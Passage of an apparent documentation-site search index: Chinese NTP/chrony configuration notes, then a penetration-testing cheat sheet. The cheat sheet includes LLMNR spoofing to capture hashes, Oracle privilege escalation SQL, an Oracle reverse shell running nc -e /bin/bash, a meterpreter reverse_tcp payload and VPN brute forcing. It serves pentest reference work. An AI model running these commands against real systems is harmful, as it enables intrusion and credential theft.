&lt;UDID&gt;\n</code></pre>"},{"location":"daily/53-ntp/","title":"ntp","text":"<p>NTP \u662f\u7f51\u7edc\u65f6\u95f4\u534f\u8bae (Network Time Protocol)\uff0c\u5b83\u662f\u7528\u6765\u540c\u6b65\u7f51\u7edc\u4e2d\u5404\u4e2a\u8ba1\u7b97\u673a\u7684\u65f6\u95f4\u7684\u534f\u8bae\u3002</p>"},{"location":"daily/53-ntp/#ntpd","title":"ntpd","text":"<p>Linux \u670d\u52a1\u5668\u4e0a\u5feb\u901f\u914d\u7f6e\u963f\u91cc\u5df4\u5df4 OPSX NTP\u670d\u52a1</p> <p>\u7f16\u8f91\u6587\u4ef6 <code>/etc/ntp.conf</code>\uff0c\u6839\u636e\u60c5\u51b5\u4fee\u6539\u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a</p> <ul> <li>\u4e92\u8054\u7f51\u4e0a\u7684\u670d\u52a1\u5668:</li> </ul> <pre><code>driftfile  /var/lib/ntp/drift\npidfile   /var/run/ntpd.pid\nlogfile /var/log/ntp.log\nrestrict    default kod nomodify notrap nopeer noquery\nrestrict -6 default kod nomodify notrap nopeer noquery\nrestrict 127.0.0.1\nserver 127.127.1.0\nfudge  127.127.1.0 stratum 10\nserver ntp.aliyun.com iburst minpoll 4 maxpoll 10\nrestrict ntp.aliyun.com nomodify notrap nopeer noquery\n</code></pre> <ul> <li>\u963f\u91cc\u4e91 ECS \u670d\u52a1\u5668:</li> </ul> <pre><code>driftfile  /var/lib/ntp/drift\npidfile   /var/run/ntpd.pid\nlogfile /var/log/ntp.log\nrestrict    default kod nomodify notrap nopeer noquery\nrestrict -6 default kod nomodify notrap nopeer noquery\nrestrict 127.0.0.1\nserver 127.127.1.0\nfudge  127.127.1.0 stratum 10\nserver ntp.aliyun.com iburst minpoll 4 maxpoll 10\nrestrict ntp.aliyun.com nomodify notrap nopeer noquery\n\nserver ntp1.cloud.aliyuncs.com iburst minpoll 4 maxpoll 10\nrestrict ntp1.cloud.aliyuncs.com nomodify notrap nopeer noquery\nserver ntp2.cloud.aliyuncs.com iburst minpoll 4 maxpoll 10\nrestrict ntp2.cloud.aliyuncs.com nomodify notrap nopeer noquery\nserver ntp3.cloud.aliyuncs.com iburst minpoll 4 maxpoll 10\nrestrict ntp3.cloud.aliyuncs.com nomodify notrap nopeer noquery\nserver ntp4.cloud.aliyuncs.com iburst minpoll 4 maxpoll 10\nrestrict ntp4.cloud.aliyuncs.com nomodify notrap nopeer noquery\nserver ntp5.cloud.aliyuncs.com iburst minpoll 4 maxpoll 10\nrestrict ntp5.cloud.aliyuncs.com nomodify notrap nopeer noquery\nserver ntp6.cloud.aliyuncs.com iburst minpoll 4 maxpoll 10\nrestrict ntp6.cloud.aliyuncs.com nomodify notrap nopeer noquery\n</code></pre> <pre><code># op\nsystemctl start ntpd\nsystemctl status ntpd\n</code></pre>"},{"location":"daily/53-ntp/#chronyd","title":"chronyd","text":"<p>\u5bf9\u4e8e\u4f7f\u7528 chrony \u5ba2\u6237\u7aef\u7684 linux \u4e3b\u673a</p> <p>\u914d\u7f6e <code>/etc/chrony.conf</code> \u6587\u4ef6\u7684\u5185\u5bb9\u4e3a\uff1a</p> <pre><code># Use public servers from the pool.ntp.org project.\n# Please consider joining the pool (http://www.pool.ntp.org/join.html).\nserver ntp.aliyun.com iburst minpoll 10 maxpoll 17\nserver ntp.tencent.com iburst\nserver ntp.ntsc.ac.cn iburst\n\n## OR\n# iburst\uff1a\u5982\u679c\u65e0\u6cd5\u4e0eNTP\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\uff0c\u542f\u7528\u52a0\u901f\u5c1d\u8bd5\uff0c\u7f29\u77ed\u521d\u59cb\u540c\u6b65\u65f6\u95f4\u3002(1\u5206\u949f\u4e00\u6b21)\n# maxpoll\uff1a\u6307\u5b9a\u65f6\u95f4\u540c\u6b65\u8bf7\u6c42\u4e4b\u95f4\u7684\u6700\u5927\u95f4\u9694\uff0c\u9ed8\u8ba4\u503c\u4e3a10\uff08\u8868\u793a2^10\u79d2\uff0c\u7ea61024\u79d2\uff09\uff08\u53ef\u90094-17\uff09\u3002\n# minpoll\uff1a\u6700\u5c0f\u65f6\u95f4\u95f4\u9694\uff0c\u9ed8\u8ba4\u503c\u662f 6\uff0c\u8868\u793a 2^6 \u79d2\uff0864\u79d2\uff09\u3002\n# maxpoll\uff1a\u6700\u5927\u65f6\u95f4\u95f4\u9694\uff0c\u9ed8\u8ba4\u503c\u662f 10\uff0c\u8868\u793a 2^10 \u79d2\uff081024\u79d2\uff09\u3002\n\n# Record the rate at which the system clock gains/losses time.\ndriftfile /var/lib/chrony/drift\n\n# Allow the system clock to be stepped in the first three updates\n# if its offset is larger than 1 second.\nmakestep 1.0 3\n\n# Enable kernel synchronization of the real-time clock (RTC).\nrtcsync\n\n# Enable hardware timestamping on all interfaces that support it.\n#hwtimestamp *\n\n# Increase the minimum number of selectable sources required to adjust\n# the system clock.\n#minsources 2\n\n# Allow NTP client access from local network.\nallow all\n\n# Serve time even if not synchronized to a time source.\n#local stratum 10\n\n# Specify file containing keys for NTP authentication.\n#keyfile /etc/chrony.keys\n\n# Specify directory for log files.\nlogdir /var/log/chrony\n\n# Select which information is logged.\n#log measurements statistics tracking\n</code></pre> <pre><code># restart\nsystemctl restart chronyd\nsystemctl status chronyd\n\n# detect server\nchronyc sources -v\nchronyc sourcestats -v\nchronyc tracking\nchronyc -a makestep # \u624b\u52a8\u89e6\u53d1\u540c\u6b65\nchronyc activity\n\nchronyc serverstats\nchronyc accheck 10.101.9.179\nchronyc -n clients\n\n# detect client\nchronyc sources -v\nchronyc sourcestats -v\nchronyc tracking\nchronyc -a makestep # \u624b\u52a8\u89e6\u53d1\u540c\u6b65\nchronyc activity\n</code></pre>"},{"location":"daily/53-ntp/#systemd-timesyncd","title":"systemd-timesyncd","text":"<pre><code># /etc/systemd/timesyncd.conf\n\n[Time]\nNTP=ntp.8ops.top\n#FallbackNTP=ntp.ubuntu.com\n#RootDistanceMaxSec=5\n#PollIntervalMinSec=32\n#PollIntervalMaxSec=2048\n</code></pre> <pre><code># \u64cd\u4f5c\u96c6\u9526\nsystemctl status systemd-timesyncd\n\ntimedatectl status\ntimedatectl timesync-status\n</code></pre>"},{"location":"daily/54-cloudstack/","title":"cloudstack","text":"<p>Reference</p> <pre><code>docker run --name cloudstack-simulator -p 5050:5050 -d apache/cloudstack-simulator:4.18.1.0\n\n\ncloudstack\nadmin:password\n</code></pre>"},{"location":"daily/55-highon-coffee/","title":"highon.coffee","text":"<p>highon.coffee</p>"},{"location":"daily/55-highon-coffee/#pre-engagement","title":"Pre-engagement","text":""},{"location":"daily/55-highon-coffee/#network-configuration","title":"Network Configuration","text":""},{"location":"daily/55-highon-coffee/#set-ip-address","title":"Set IP Address","text":"<pre><code>ifconfig eth0 xxx.xxx.xxx.xxx/24 \n</code></pre>"},{"location":"daily/55-highon-coffee/#subnetting","title":"Subnetting","text":"<pre><code>ipcalc xxx.xxx.xxx.xxx/24 \nipcalc xxx.xxx.xxx.xxx 255.255.255.0 \n</code></pre>"},{"location":"daily/55-highon-coffee/#osint","title":"OSINT","text":""},{"location":"daily/55-highon-coffee/#passive-information-gathering","title":"Passive Information Gathering","text":""},{"location":"daily/55-highon-coffee/#dns","title":"DNS","text":""},{"location":"daily/55-highon-coffee/#whois-enumeration","title":"WHOIS enumeration","text":"<pre><code>whois domain-name-here.com \n</code></pre>"},{"location":"daily/55-highon-coffee/#perform-dns-ip-lookup","title":"Perform DNS IP Lookup","text":"<pre><code>dig a domain-name-here.com @nameserver \n</code></pre>"},{"location":"daily/55-highon-coffee/#perform-mx-record-lookup","title":"Perform MX Record Lookup","text":"<pre><code>dig mx domain-name-here.com @nameserver\n</code></pre>"},{"location":"daily/55-highon-coffee/#perform-zone-transfer-with-dig","title":"Perform Zone Transfer with DIG","text":"<pre><code>dig axfr domain-name-here.com @nameserver\n</code></pre>"},{"location":"daily/55-highon-coffee/#dns-zone-transfers","title":"DNS Zone Transfers","text":"COMMAND DESCRIPTION <code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code> Windows DNS zone transfer <code>dig axfr blah.com @ns1.blah.com</code> Linux DNS zone transfer"},{"location":"daily/55-highon-coffee/#email","title":"Email","text":""},{"location":"daily/55-highon-coffee/#simply-email","title":"Simply Email","text":"<p>Use Simply Email to enumerate all the online places (github, target site etc), it works better if you use proxies or set long throttle times so google doesn\u2019t think you\u2019re a robot and make you fill out a Captcha.</p> <pre><code>git clone https://github.com/killswitch-GUI/SimplyEmail.git\n./SimplyEmail.py -all -e TARGET-DOMAIN\n</code></pre> <p>Simply Email can verify the discovered email addresss after gathering.</p>"},{"location":"daily/55-highon-coffee/#semi-active-information-gathering","title":"Semi Active Information Gathering","text":""},{"location":"daily/55-highon-coffee/#basic-finger-printing","title":"Basic Finger Printing","text":"<p>Manual finger printing / banner grabbing.</p> COMMAND DESCRIPTION <code>nc -v 192.168.1.1 25``telnet 192.168.1.1 25</code> Basic versioning / finger printing via displayed banner"},{"location":"daily/55-highon-coffee/#banner-grabbing-with-nc","title":"Banner grabbing with NC","text":"<pre><code>nc TARGET-IP 80\nGET / HTTP/1.1\nHost: TARGET-IP\nUser-Agent: Mozilla/5.0\nReferrer: meh-domain\n&lt;enter&gt;\n</code></pre>"},{"location":"daily/55-highon-coffee/#active-information-gathering","title":"Active Information Gathering","text":""},{"location":"daily/55-highon-coffee/#dns-bruteforce","title":"DNS Bruteforce","text":""},{"location":"daily/55-highon-coffee/#dnsrecon","title":"DNSRecon","text":"<p>DNS Enumeration Kali - DNSRecon</p> <p>root:~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</p>"},{"location":"daily/55-highon-coffee/#port-scanning","title":"Port Scanning","text":""},{"location":"daily/55-highon-coffee/#nmap-commands","title":"Nmap Commands","text":"<p>For more commands, see the Nmap cheat sheet (link in the menu on the right).</p> <p>Basic Nmap Commands:</p> COMMAND DESCRIPTION <code>nmap -v -sS -A -T4 target</code> Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services <code>nmap -v -sS -p--A -T4 target</code> As above but scans all TCP ports (takes a lot longer) <code>nmap -v -sU -sS -p- -A -T4 target</code> As above but scans all TCP ports and UDP scan (takes even longer) <code>nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X</code> Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover <code>ls /usr/share/nmap/scripts/* | grep ftp</code> Search nmap scripts for keywords <p>I\u2019ve had a few people mention about T4 scans, apply common sense here. Don\u2019t use T4 commands on external pen tests (when using an Internet connection), you\u2019re probably better off using a T2 with a TCP connect scan. A T4 scan would likely be better suited for an internal pen test, over low latency links with plenty of bandwidth. But it all depends on the target devices, embeded devices are going to struggle if you T4 / T5 them and give inconclusive results. As a general rule of thumb, scan as slowly as you can, or do a fast scan for the top 1000 so you can start pen testing then kick off a slower scan.</p>"},{"location":"daily/55-highon-coffee/#nmap-udp-scanning","title":"Nmap UDP Scanning","text":"<pre><code>nmap -sU TARGET \n</code></pre>"},{"location":"daily/55-highon-coffee/#udp-protocol-scanner","title":"UDP Protocol Scanner","text":"<pre><code>git clone https://github.com/portcullislabs/udp-proto-scanner.git\n</code></pre> <p>Scan a file of IP addresses for all services:</p> <pre><code>./udp-protocol-scanner.pl -f ip.txt \n</code></pre> <p>Scan for a specific UDP service:</p> <pre><code>udp-proto-scanner.pl -p ntp -f ips.txt\n</code></pre>"},{"location":"daily/55-highon-coffee/#other-host-discovery","title":"Other Host Discovery","text":"<p>Other methods of host discovery, that don\u2019t use nmap\u2026</p> COMMAND DESCRIPTION <code>netdiscover -r 192.168.1.0/24</code> Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site"},{"location":"daily/55-highon-coffee/#enumeration-attacking-network-services","title":"Enumeration &amp; Attacking Network Services","text":"<p>Penetration testing tools that spefically identify and / or enumerate network services:</p>"},{"location":"daily/55-highon-coffee/#samb-smb-windows-domain-enumeration","title":"SAMB / SMB / Windows Domain Enumeration","text":""},{"location":"daily/55-highon-coffee/#samba-enumeration","title":"Samba Enumeration","text":""},{"location":"daily/55-highon-coffee/#smb-enumeration-tools","title":"SMB Enumeration Tools","text":"<pre><code>nmblookup -A target\nsmbclient //MOUNT/share -I target -N\nrpcclient -U \"\" target\nenum4linux target\n</code></pre> <p>Also see, nbtscan cheat sheet (right hand menu).</p> COMMAND DESCRIPTION <code>nbtscan 192.168.1.0/24</code> Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain <code>enum4linux -a target-ip</code> Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing"},{"location":"daily/55-highon-coffee/#fingerprint-smb-version","title":"Fingerprint SMB Version","text":"<pre><code>smbclient -L //192.168.1.100 \n</code></pre>"},{"location":"daily/55-highon-coffee/#find-open-smb-shares","title":"Find open SMB Shares","text":"<pre><code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   \n</code></pre>"},{"location":"daily/55-highon-coffee/#enumerate-smb-users","title":"Enumerate SMB Users","text":"<pre><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 \npython /usr/share/doc/python-impacket-doc/examples\n/samrdump.py 192.168.XXX.XXX\n</code></pre> <p>RID Cycling:</p> <pre><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt\n</code></pre> <p>Metasploit module for RID cycling:</p> <pre><code>use auxiliary/scanner/smb/smb_lookupsid\n</code></pre>"},{"location":"daily/55-highon-coffee/#manual-null-session-testing","title":"Manual Null session testing:","text":"<p>Windows:</p> <pre><code>net use \\\\TARGET\\IPC$ \"\" /u:\"\"\n</code></pre> <p>Linux:</p> <pre><code>smbclient -L //192.168.99.131\n</code></pre>"},{"location":"daily/55-highon-coffee/#nbtscan-unixwiz","title":"NBTScan unixwiz","text":"<p>Install on Kali rolling:</p> <pre><code>apt-get install nbtscan-unixwiz \nnbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan\n</code></pre>"},{"location":"daily/55-highon-coffee/#llmnr-nbt-ns-spoofing","title":"LLMNR / NBT-NS Spoofing","text":"<p>Steal credentials off the network.</p>"},{"location":"daily/55-highon-coffee/#metasploit-llmnr-netbios-requests","title":"Metasploit LLMNR / NetBIOS requests","text":"<p>Spoof / poison LLMNR / NetBIOS requests:</p> <pre><code>auxiliary/spoof/llmnr/llmnr_response\nauxiliary/spoof/nbns/nbns_response\n</code></pre> <p>Capture the hashes:</p> <pre><code>auxiliary/server/capture/smb\nauxiliary/server/capture/http_ntlm\n</code></pre> <p>You\u2019ll end up with NTLMv2 hash, use john or hashcat to crack it.</p>"},{"location":"daily/55-highon-coffee/#responderpy","title":"Responder.py","text":"<p>Alternatively you can use responder.</p> <pre><code>git clone https://github.com/SpiderLabs/Responder.git\npython Responder.py -i local-ip -I eth0\n</code></pre>"},{"location":"daily/55-highon-coffee/#run-responderpy-for-the-whole-engagement","title":"Run Responder.py for the whole engagement","text":"<p>Run Responder.py for the length of the engagement while you're working on other attack vectors.</p>"},{"location":"daily/55-highon-coffee/#snmp-enumeration-tools","title":"SNMP Enumeration Tools","text":"<p>A number of SNMP enumeration tools.</p> <p>Fix SNMP output values so they are human readable:</p> <pre><code>apt-get install snmp-mibs-downloader download-mibs\necho \"\" &gt; /etc/snmp/snmp.conf\n</code></pre> COMMAND DESCRIPTION <code>snmpcheck -t 192.168.1.X -c public``snmpwalk -c public -v1 192.168.1.X 1|  grep hrSWRunName|cut -d* * -f ``snmpenum -t 192.168.1.X``onesixtyone -c names -i hosts</code> SNMP enumeration"},{"location":"daily/55-highon-coffee/#snmpv3-enumeration-tools","title":"SNMPv3 Enumeration Tools","text":"<p>Idenitfy SNMPv3 servers with nmap:</p> <pre><code>nmap -sV -p 161 --script=snmp-info TARGET-SUBNET\n</code></pre> <p>Rory McCune\u2019s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:</p> <pre><code>apt-get install snmp snmp-mibs-downloader\nwget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb\n</code></pre>"},{"location":"daily/55-highon-coffee/#use-metasploits-wordlist","title":"Use Metasploits Wordlist","text":"<p>Metasploit's wordlist (KALI path below) has common credentials for v1 &amp; 2 of SNMP, for newer credentials check out Daniel Miessler's SecLists project on GitHub (not the mailing list!).</p> <pre><code>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt\n</code></pre>"},{"location":"daily/55-highon-coffee/#r-services-enumeration","title":"R Services Enumeration","text":"<p>This is legacy, included for completeness.</p> <p>nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation:</p>"},{"location":"daily/55-highon-coffee/#rsh-enumeration","title":"RSH Enumeration","text":""},{"location":"daily/55-highon-coffee/#rsh-run-commands","title":"RSH Run Commands","text":"<pre><code>rsh &lt;target&gt; &lt;command&gt;\n</code></pre>"},{"location":"daily/55-highon-coffee/#metasploit-rsh-login-scanner","title":"Metasploit RSH Login Scanner","text":"<pre><code>auxiliary/scanner/rservices/rsh_login\n</code></pre>"},{"location":"daily/55-highon-coffee/#rusers-show-logged-in-users","title":"rusers Show Logged in Users","text":"<pre><code>rusers -al 192.168.2.1\n</code></pre>"},{"location":"daily/55-highon-coffee/#rusers-scan-whole-subnet","title":"rusers scan whole Subnet","text":"<pre><code>rlogin -l &lt;user&gt; &lt;target&gt;\n</code></pre> <p>e.g rlogin -l root TARGET-SUBNET/24</p>"},{"location":"daily/55-highon-coffee/#finger-enumeration","title":"Finger Enumeration","text":"<pre><code>finger @TARGET-IP\n</code></pre>"},{"location":"daily/55-highon-coffee/#finger-a-specific-username","title":"Finger a Specific Username","text":"<pre><code>finger batman@TARGET-IP \n</code></pre>"},{"location":"daily/55-highon-coffee/#solaris-bug-that-shows-all-logged-in-users","title":"Solaris bug that shows all logged in users:","text":"<pre><code>finger 0@host  \n\nSunOS: RPC services allow user enum:\n$ rusers # users logged onto LAN\n\nfinger 'a b c d e f g h'@sunhost \n</code></pre>"},{"location":"daily/55-highon-coffee/#rwho","title":"rwho","text":"<p>Use nmap to identify machines running rwhod (513 UDP)</p>"},{"location":"daily/55-highon-coffee/#tls-ssl-testing","title":"TLS &amp; SSL Testing","text":""},{"location":"daily/55-highon-coffee/#testsslsh","title":"testssl.sh","text":"<p>Test all the things on a single host and output to a .html file:</p> <pre><code>./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html  \n</code></pre>"},{"location":"daily/55-highon-coffee/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<p>Install OpenVAS 8 on Kali Rolling:</p> <pre><code>apt-get update\napt-get dist-upgrade -y\napt-get install openvas\nopenvas-setup\n</code></pre> <p>Verify openvas is running using:</p> <pre><code>netstat -tulpn\n</code></pre> <p>Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup.</p>"},{"location":"daily/55-highon-coffee/#database-penetration-testing","title":"Database Penetration Testing","text":"<p>Attacking database servers exposed on the network.</p>"},{"location":"daily/55-highon-coffee/#oracle","title":"Oracle","text":"<p>Install oscanner:</p> <pre><code>apt-get install oscanner  \n</code></pre> <p>Run oscanner:</p> <pre><code>oscanner -s 192.168.1.200 -P 1521 \n</code></pre>"},{"location":"daily/55-highon-coffee/#fingerprint-oracle-tns-version","title":"Fingerprint Oracle TNS Version","text":"<p>Install tnscmd10g:</p> <pre><code>apt-get install tnscmd10g\n</code></pre> <p>Fingerprint oracle tns:</p> <pre><code>tnscmd10g version -h TARGET\nnmap --script=oracle-tns-version \n</code></pre>"},{"location":"daily/55-highon-coffee/#brute-force-oracle-user-accounts","title":"Brute force oracle user accounts","text":"<p>Identify default Oracle accounts:</p> <pre><code> nmap --script=oracle-sid-brute \n nmap --script=oracle-brute \n</code></pre> <p>Run nmap scripts against Oracle TNS:</p> <pre><code>nmap -p 1521 -A TARGET\n</code></pre>"},{"location":"daily/55-highon-coffee/#oracle-privilege-escalation","title":"Oracle Privilege Escalation","text":"<p>Requirements:</p> <ul> <li>Oracle needs to be exposed on the network</li> <li>A default account is in use like scott</li> </ul> <p>Quick overview of how this works:</p> <ol> <li>Create the function</li> <li>Create an index on table SYS.DUAL</li> <li>The index we just created executes our function SCOTT.DBA_X</li> <li>The function will be executed by SYS user (as that\u2019s the user that owns the table).</li> <li>Create an account with DBA priveleges</li> </ol> <p>In the example below the user SCOTT is used but this should be possible with another default Oracle account.</p>"},{"location":"daily/55-highon-coffee/#identify-default-accounts-within-oracle-db-using-nmap-nse-scripts","title":"Identify default accounts within oracle db using NMAP NSE scripts:","text":"<pre><code>nmap --script=oracle-sid-brute \nnmap --script=oracle-brute \n</code></pre> <p>Login using the identified weak account (assuming you find one).</p>"},{"location":"daily/55-highon-coffee/#how-to-identify-the-current-privilege-level-for-an-oracle-user","title":"How to identify the current privilege level for an oracle user:","text":"<pre><code>SQL&gt; select * from session_privs; \n\nSQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid \ncurren_user is \npragma autonomous_transaction; \nbegin \nexecute immediate 'grant dba to user1 identified by pass1';\ncommit;\nreturn 'FOO';\nend;\n</code></pre>"},{"location":"daily/55-highon-coffee/#oracle-priv-esc-and-obtain-dba-access","title":"Oracle priv esc and obtain DBA access:","text":"<p>Run netcat: <code>netcat -nvlp 443</code>code&gt;</p> <pre><code>SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));\n</code></pre>"},{"location":"daily/55-highon-coffee/#run-the-exploit-with-a-select-query","title":"Run the exploit with a select query:","text":"<pre><code>SQL&gt; Select * from session_privs; \n</code></pre> <p>You should have a DBA user with creds user1 and pass1.</p> <p>Verify you have DBA privileges by re-running the first command again.</p>"},{"location":"daily/55-highon-coffee/#remove-the-exploit-using","title":"Remove the exploit using:","text":"<pre><code>drop index exploit_1337; \n</code></pre>"},{"location":"daily/55-highon-coffee/#get-oracle-reverse-os-shell","title":"Get Oracle Reverse os-shell:","text":"<pre><code>begin\ndbms_scheduler.create_job( job_name    =&gt; 'MEH1337',job_type    =&gt;\n    'EXECUTABLE',job_action =&gt; '/bin/nc',number_of_arguments =&gt; 4,start_date =&gt;\n    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); \ndbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');\ndbms_scheduler.set_job_argument_value('rev_shell', 2, '443');\ndbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');\ndbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');\ndbms_scheduler.enable('rev_shell'); \nend; \n</code></pre>"},{"location":"daily/55-highon-coffee/#mssql","title":"MSSQL","text":"<p>Enumeration / Discovery:</p> <p>Nmap:</p> <pre><code>nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156\n</code></pre> <p>Metasploit:</p> <pre><code>msf &gt; use auxiliary/scanner/mssql/mssql_ping\n</code></pre>"},{"location":"daily/55-highon-coffee/#use-ms-sql-servers-browse-for-more","title":"Use MS SQL Servers Browse For More","text":"<p>Try using \"Browse for More\" via MS SQL Server Management Studio</p>"},{"location":"daily/55-highon-coffee/#bruteforce-mssql-login","title":"Bruteforce MSSQL Login","text":"<pre><code>msf &gt; use auxiliary/admin/mssql/mssql_enum\n</code></pre>"},{"location":"daily/55-highon-coffee/#metasploit-mssql-shell","title":"Metasploit MSSQL Shell","text":"<pre><code>msf &gt; use exploit/windows/mssql/mssql_payload\nmsf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\n</code></pre>"},{"location":"daily/55-highon-coffee/#network","title":"Network","text":""},{"location":"daily/55-highon-coffee/#plinkexe-tunnel","title":"Plink.exe Tunnel","text":"<p>PuTTY Link tunnel</p> <p>Forward remote port to local address:</p> <pre><code>plink.exe -P 22 -l root -pw \"1337\" -R 445:127.0.0.1:445 REMOTE-IP\n</code></pre>"},{"location":"daily/55-highon-coffee/#pivoting","title":"Pivoting","text":""},{"location":"daily/55-highon-coffee/#ssh-pivoting","title":"SSH Pivoting","text":"<pre><code>ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip\n</code></pre> <p>Add socks4 127.0.0.1 1010 in /etc/proxychains.conf</p> <p>SSH pivoting from one network to another:</p> <pre><code>ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1\n</code></pre> <p>Add socks4 127.0.0.1 1010 in /etc/proxychains.conf</p> <pre><code>proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2\n</code></pre> <p>Add socks4 127.0.0.1 1011 in /etc/proxychains.conf</p>"},{"location":"daily/55-highon-coffee/#meterpreter-pivoting","title":"Meterpreter Pivoting","text":""},{"location":"daily/55-highon-coffee/#ttl-finger-printing","title":"TTL Finger Printing","text":"OPERATING SYSTEM TTL SIZE Windows <code>128</code> Linux <code>64</code> Solaris <code>255</code> Cisco / Network <code>255</code>"},{"location":"daily/55-highon-coffee/#ipv4-cheat-sheets","title":"IPv4 Cheat Sheets","text":""},{"location":"daily/55-highon-coffee/#classful-ip-ranges","title":"Classful IP Ranges","text":"<p>E.g Class A,B,C (depreciated)</p> CLASS IP ADDRESS RANGE Class A IP Address Range <code>0.0.0.0 - 127.255.255.255</code> Class B IP Address Range <code>128.0.0.0 - 191.255.255.255</code> Class C IP Address Range <code>192.0.0.0 - 223.255.255.255</code> Class D IP Address Range <code>224.0.0.0 - 239.255.255.255</code> Class E IP Address Range <code>240.0.0.0 - 255.255.255.255</code>"},{"location":"daily/55-highon-coffee/#ipv4-private-address-ranges","title":"IPv4 Private Address Ranges","text":"CLASS RANGE Class A Private Address Range <code>10.0.0.0 - 10.255.255.255</code> Class B Private Address Range <code>172.16.0.0 - 172.31.255.255</code> Class C Private Address Range <code>192.168.0.0 - 192.168.255.255</code> <code>127.0.0.0 - 127.255.255.255</code>"},{"location":"daily/55-highon-coffee/#ipv4-subnet-cheat-sheet","title":"IPv4 Subnet Cheat Sheet","text":"<p>Subnet cheat sheet, not really realted to pen testing but a useful reference.</p> CIDR DECIMAL MASK NUMBER OF HOSTS /31 <code>255.255.255.254</code> <code>1 Host</code> /30 <code>255.255.255.252</code> <code>2 Hosts</code> /29 <code>255.255.255.249</code> <code>6 Hosts</code> /28 <code>255.255.255.240</code> <code>14 Hosts</code> /27 <code>255.255.255.224</code> <code>30 Hosts</code> /26 <code>255.255.255.192</code> <code>62 Hosts</code> /25 <code>255.255.255.128</code> <code>126 Hosts</code> /24 <code>255.255.255.0</code> <code>254 Hosts</code> /23 <code>255.255.254.0</code> <code>512 Host</code> /22 <code>255.255.252.0</code> <code>1022 Hosts</code> /21 <code>255.255.248.0</code> <code>2046 Hosts</code> /20 <code>255.255.240.0</code> <code>4094 Hosts</code> /19 <code>255.255.224.0</code> <code>8190 Hosts</code> /18 <code>255.255.192.0</code> <code>16382 Hosts</code> /17 <code>255.255.128.0</code> <code>32766 Hosts</code> /16 <code>255.255.0.0</code> <code>65534 Hosts</code> /15 <code>255.254.0.0</code> <code>131070 Hosts</code> /14 <code>255.252.0.0</code> <code>262142 Hosts</code> /13 <code>255.248.0.0</code> <code>524286 Hosts</code> /12 <code>255.240.0.0</code> <code>1048674 Hosts</code> /11 <code>255.224.0.0</code> <code>2097150 Hosts</code> /10 <code>255.192.0.0</code> <code>4194302 Hosts</code> /9 <code>255.128.0.0</code> <code>8388606 Hosts</code> /8 <code>255.0.0.0</code> <code>16777214 Hosts</code>"},{"location":"daily/55-highon-coffee/#vlan-hopping","title":"VLAN Hopping","text":"<p>Using NCCGroups VLAN wrapper script for Yersina simplifies the process.</p> <pre><code>git clone https://github.com/nccgroup/vlan-hopping.git\nchmod 700 frogger.sh\n./frogger.sh \n</code></pre>"},{"location":"daily/55-highon-coffee/#vpn-pentesting-tools","title":"VPN Pentesting Tools","text":"<p>Identify VPN servers:</p> <pre><code>./udp-protocol-scanner.pl -p ike TARGET(s)\n</code></pre> <p>Scan a range for VPN servers:</p> <pre><code>./udp-protocol-scanner.pl -p ike -f ip.txt\n</code></pre>"},{"location":"daily/55-highon-coffee/#ikeforce","title":"IKEForce","text":"<p>Use IKEForce to enumerate or dictionary attack VPN servers.</p> <p>Install:</p> <pre><code>pip install pyip\ngit clone https://github.com/SpiderLabs/ikeforce.git\n</code></pre> <p>Perform IKE VPN enumeration with IKEForce:</p> <pre><code>./ikeforce.py TARGET-IP \u2013e \u2013w wordlists/groupnames.dic\n</code></pre> <p>Bruteforce IKE VPN using IKEForce:</p> <pre><code>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1\nike-scan\nike-scan TARGET-IP\nike-scan -A TARGET-IP\nike-scan -A TARGET-IP --id=myid -P TARGET-IP-key\n</code></pre>"},{"location":"daily/55-highon-coffee/#ike-aggressive-mode-psk-cracking","title":"IKE Aggressive Mode PSK Cracking","text":"<ol> <li>Identify VPN Servers</li> <li>Enumerate with IKEForce to obtain the group ID</li> <li>Use ike-scan to capture the PSK hash from the IKE endpoint</li> <li>Use psk-crack to crack the hash</li> </ol>"},{"location":"daily/55-highon-coffee/#step-1-idenitfy-ike-servers","title":"Step 1: Idenitfy IKE Servers","text":"<pre><code>./udp-protocol-scanner.pl -p ike SUBNET/24\n</code></pre>"},{"location":"daily/55-highon-coffee/#step-2-enumerate-group-name-with-ikeforce","title":"Step 2: Enumerate group name with IKEForce","text":"<pre><code>./ikeforce.py TARGET-IP \u2013e \u2013w 